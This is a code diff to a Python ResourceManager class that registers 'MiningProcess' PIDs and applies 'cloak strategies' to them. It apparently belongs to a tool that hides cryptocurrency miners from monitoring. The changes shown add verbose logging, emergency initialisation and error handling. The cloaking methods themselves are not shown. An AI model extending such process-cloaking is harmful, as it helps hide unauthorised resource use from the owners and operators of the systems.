@@ -303,25 +303,57 @@ class ResourceManager(IResourceManager):
             self.logger.error(f"Lỗi xử lý process registration: {e}")
 
     def trigger_cloaking(self, process: MiningProcess, source: str):
-        """**Trigger Cloaking for Process** (kích hoạt che giấu cho process)"""
+        """**TIER 1 FIX: Enhanced Trigger Cloaking** (kích hoạt che giấu nâng cao)"""
         try:
-            if not self.shared_resource_manager:
-                self.logger.warning("SharedResourceManager chưa khởi tạo")
-                return
-
-            # **Determine Strategies** (xác định chiến lược)
-            strategies = self._determine_strategies(process)
+            self.logger.info(f"🎯 [TIER-1] trigger_cloaking called for PID {process.pid} from source: {source}")
             
-            # **Apply Strategies** (áp dụng chiến lược)
-            for strategy_name in strategies:
-                success = self.shared_resource_manager.apply_cloak_strategy(strategy_name, process)
-                if success:
-                    self.logger.info(f"Cloaking thành công: {strategy_name} cho PID {process.pid}")
+            # **TIER 1 FIX: Enhanced SharedResourceManager validation** (xác thực SharedResourceManager nâng cao)
+            if not self.shared_resource_manager:
+                self.logger.error(f"❌ [TIER-1] CRITICAL: SharedResourceManager chưa khởi tạo cho PID {process.pid}")
+                self.logger.error(f"🔍 [TIER-1] ResourceManager state: started={getattr(self, '_started', False)}")
+                self.logger.error(f"🔍 [TIER-1] This is the ROOT CAUSE của cloaking failure!")
+                
+                # **TIER 1 FIX: Attempt lazy initialization** (thử khởi tạo trễ)
+                if hasattr(self, 'config') and self.config:
+                    self.logger.info(f"🔄 [TIER-1] Attempting emergency SharedResourceManager initialization...")
+                    try:
+                        resource_managers = {'main': self}
+                        self.shared_resource_manager = SharedResourceManager(
+                            self.config, self.logger, resource_managers
+                        )
+                        self.logger.info(f"✅ [TIER-1] Emergency SharedResourceManager initialization successful")
+                    except Exception as init_error:
+                        self.logger.error(f"❌ [TIER-1] Emergency initialization failed: {init_error}")
+                        return
                 else:
-                    self.logger.warning(f"Cloaking thất bại: {strategy_name} cho PID {process.pid}")
+                    self.logger.error(f"❌ [TIER-1] Cannot emergency initialize - config missing")
+                    return
+
+            # **TIER 1 FIX: Enhanced Determine Strategies** (xác định chiến lược nâng cao)
+            self.logger.info(f"🔍 [TIER-1] _determine_strategies cho PID {process.pid}...")
+            strategies = self._determine_strategies(process)
+            self.logger.info(f"📋 [TIER-1] Strategies determined: {strategies}")
+            
+            # **TIER 1 FIX: Enhanced Apply Strategies** (áp dụng chiến lược nâng cao)
+            success_count = 0
+            for strategy_name in strategies:
+                self.logger.info(f"🔧 [TIER-1] Applying strategy: {strategy_name} cho PID {process.pid}")
+                try:
+                    success = self.shared_resource_manager.apply_cloak_strategy(strategy_name, process)
+                    if success:
+                        success_count += 1
+                        self.logger.info(f"✅ [TIER-1] Cloaking thành công: {strategy_name} cho PID {process.pid}")
+                    else:
+                        self.logger.warning(f"⚠️ [TIER-1] Cloaking thất bại: {strategy_name} cho PID {process.pid}")
+                except Exception as strategy_error:
+                    self.logger.error(f"❌ [TIER-1] Strategy {strategy_name} error: {strategy_error}")
+            
+            self.logger.info(f"📊 [TIER-1] Cloaking summary: {success_count}/{len(strategies)} strategies successful for PID {process.pid}")
                     
         except Exception as e:
-            self.logger.error(f"Lỗi trigger cloaking cho PID {process.pid}: {e}")
+            self.logger.error(f"❌ [TIER-1] Lỗi trigger cloaking cho PID {process.pid}: {e}")
+            import traceback
+            self.logger.error(f"📋 [TIER-1] Full traceback: {traceback.format_exc()}")
 
     def _determine_strategies(self, process: MiningProcess) -> List[str]:
         """**Determine Cloaking Strategies** (xác định chiến lược che giấu)"""
@@ -370,29 +402,53 @@ class ResourceManager(IResourceManager):
         return metrics
 
     def start(self):
-        """**Start ResourceManager** (khởi động ResourceManager)"""
+        """**TIER 1 FIX: Enhanced ResourceManager Start** (khởi động ResourceManager nâng cao)"""
         try:
-            self.logger.info("Khởi động ResourceManager...")
+            self.logger.info("🚀 [TIER-1] Khởi động ResourceManager với enhanced initialization...")
             
-            # **Initialize Shared Resource Manager** (khởi tạo Shared Resource Manager)
+            # **TIER 1 FIX: Validate prerequisites** (xác thực điều kiện tiên quyết)
+            if not self.config:
+                raise ValueError("Configuration missing - cannot start ResourceManager")
+            
+            # **TIER 1 FIX: Initialize Shared Resource Manager with validation** (khởi tạo Shared Resource Manager với xác thực)
+            self.logger.info("🔧 [TIER-1] Initializing SharedResourceManager...")
             resource_managers = {'main': self}
-            self.shared_resource_manager = SharedResourceManager(
-                self.config, self.logger, resource_managers
-            )
+            
+            try:
+                self.shared_resource_manager = SharedResourceManager(
+                    self.config, self.logger, resource_managers
+                )
+                self.logger.info("✅ [TIER-1] SharedResourceManager initialized successfully")
+                
+                # **TIER 1 FIX: Validate SharedResourceManager** (xác thực SharedResourceManager)
+                if not self.shared_resource_manager:
+                    raise RuntimeError("SharedResourceManager initialization returned None")
+                    
+            except Exception as srm_error:
+                self.logger.error(f"❌ [TIER-1] SharedResourceManager initialization failed: {srm_error}")
+                raise RuntimeError(f"Critical: SharedResourceManager failed to initialize: {srm_error}")
             
             # **Start Worker Threads** (khởi động worker threads)
+            self.logger.info("⚙️ [TIER-1] Starting worker threads...")
             self._start_workers()
             
             # **DirectPIDRegistry Observer** (DirectPIDRegistry observer đã được thiết lập trong __init__)
             # Process discovery sẽ được xử lý thông qua DirectPIDRegistry callbacks
             
-            # **Signal Ready** (báo hiệu sẵn sàng)
+            # **TIER 1 FIX: Enhanced Ready Signal with validation** (tín hiệu sẵn sàng nâng cao với xác thực)
+            self.logger.info("🎯 [TIER-1] Signaling ResourceManager ready...")
             self.signal_ready()
             
-            self.logger.info("ResourceManager đã khởi động thành công")
+            # **TIER 1 FIX: Final validation** (xác thực cuối cùng)
+            if self.shared_resource_manager is None:
+                raise RuntimeError("Critical validation failed: SharedResourceManager is None after initialization")
+            
+            self.logger.info("✅ [TIER-1] ResourceManager đã khởi động thành công với SharedResourceManager")
+            self.logger.info(f"🔍 [TIER-1] SharedResourceManager status: {self.shared_resource_manager is not None}")
             
         except Exception as e:
-            self.logger.error(f"Lỗi khởi động ResourceManager: {e}")
+            self.logger.error(f"❌ [TIER-1] Lỗi khởi động ResourceManager: {e}")
+            self.logger.error(f"🔍 [TIER-1] SharedResourceManager status: {getattr(self, 'shared_resource_manager', 'Not initialized')}")
             raise
 
     def _start_workers(self):
@@ -480,7 +536,7 @@ class ResourceManager(IResourceManager):
 
     def receive_from_registry(self, pid: int, registry_metadata: Dict[str, Any]) -> bool:
         """
-        **Receive PID from DirectPIDRegistry** (nhận PID từ DirectPIDRegistry)
+        **TIER 2 FIX: Enhanced Receive PID from DirectPIDRegistry** (nhận PID từ DirectPIDRegistry nâng cao)
         
         **Critical Interface Method** (phương thức giao diện quan trọng) cho DirectPIDRegistry → ResourceManager handoff.
         
@@ -492,37 +548,67 @@ class ResourceManager(IResourceManager):
             bool: True if cloaking successfully triggered
         """
         try:
-            self.logger.info(f"🔄 [RM-HANDOFF] Nhận PID {pid} từ DirectPIDRegistry")
+            self.logger.info(f"🎯 [TIER-2] receive_from_registry called for PID {pid}")
+            self.logger.info(f"🔍 [TIER-2] Registry metadata keys: {list(registry_metadata.keys())}")
             
-            # **Create MiningProcess Object** (tạo đối tượng MiningProcess)
+            # **TIER 2 FIX: Enhanced SharedResourceManager validation** (xác thực SharedResourceManager nâng cao)
+            if not self.shared_resource_manager:
+                self.logger.error(f"❌ [TIER-2] CRITICAL: SharedResourceManager is None trong receive_from_registry cho PID {pid}")
+                self.logger.error(f"🔍 [TIER-2] This will cause trigger_cloaking to return early!")
+                
+                # **TIER 2 FIX: Try emergency initialization** (thử khởi tạo khẩn cấp)
+                if hasattr(self, 'config') and self.config:
+                    self.logger.info(f"🔄 [TIER-2] Attempting emergency SharedResourceManager initialization in receive_from_registry...")
+                    try:
+                        resource_managers = {'main': self}
+                        self.shared_resource_manager = SharedResourceManager(
+                            self.config, self.logger, resource_managers
+                        )
+                        self.logger.info(f"✅ [TIER-2] Emergency SharedResourceManager initialization successful in receive_from_registry")
+                    except Exception as init_error:
+                        self.logger.error(f"❌ [TIER-2] Emergency initialization failed in receive_from_registry: {init_error}")
+                        return False
+                else:
+                    self.logger.error(f"❌ [TIER-2] Cannot emergency initialize in receive_from_registry - config missing")
+                    return False
+            else:
+                self.logger.info(f"✅ [TIER-2] SharedResourceManager is available in receive_from_registry")
+            
+            # **TIER 2 FIX: Enhanced MiningProcess creation** (tạo đối tượng MiningProcess nâng cao)
+            self.logger.info(f"🔧 [TIER-2] Creating MiningProcess object for PID {pid}")
             mining_process = MiningProcess(
                 pid=pid,
                 name=registry_metadata.get('name', f'process_{pid}'),
                 cmd=registry_metadata.get('cmd', [])
             )
+            self.logger.info(f"✅ [TIER-2] MiningProcess created: {mining_process.name}")
             
-            # **🥇 SOLUTION 1: Queue PID for Processing** (đưa PID vào queue để xử lý)
+            # **TIER 2 FIX: Enhanced PID queue processing** (xử lý queue PID nâng cao)
             pid_data = {
                 'pid': pid,
                 'mining_process': mining_process,
                 'registry_metadata': registry_metadata,
                 'timestamp': time.time(),
-                'source': 'direct_registry_handoff'
+                'source': 'direct_registry_handoff',
+                'tier2_enhanced': True
             }
             
             try:
                 self._pid_queue.put(pid_data, block=False)
-                self.logger.info(f"✅ [RM-HANDOFF] PID {pid} queued for processing")
+                self.logger.info(f"✅ [TIER-2] PID {pid} queued for processing successfully")
                 return True
             except queue.Full:
-                self.logger.error(f"❌ [RM-HANDOFF] PID queue full, processing immediately for PID {pid}")
-                # Fallback to immediate processing
-                self._process_pid_immediately(pid_data)
-                return True
+                self.logger.warning(f"⚠️ [TIER-2] PID queue full, processing immediately for PID {pid}")
+                # **TIER 2 FIX: Enhanced immediate processing** (xử lý ngay lập tức nâng cao)
+                success = self._process_pid_immediately(pid_data)
+                self.logger.info(f"📊 [TIER-2] Immediate processing result for PID {pid}: {success}")
+                return success
             
         except Exception as e:
-            self.logger.error(f"❌ [RM-HANDOFF] Lỗi xử lý PID {pid}: {e}")
-            self.logger.error(f"Registry metadata: {registry_metadata}")
+            self.logger.error(f"❌ [TIER-2] Lỗi xử lý PID {pid} trong receive_from_registry: {e}")
+            self.logger.error(f"🔍 [TIER-2] Registry metadata: {registry_metadata}")
+            import traceback
+            self.logger.error(f"📋 [TIER-2] Full traceback: {traceback.format_exc()}")
             return False
 
     def _persistent_monitoring_loop(self):
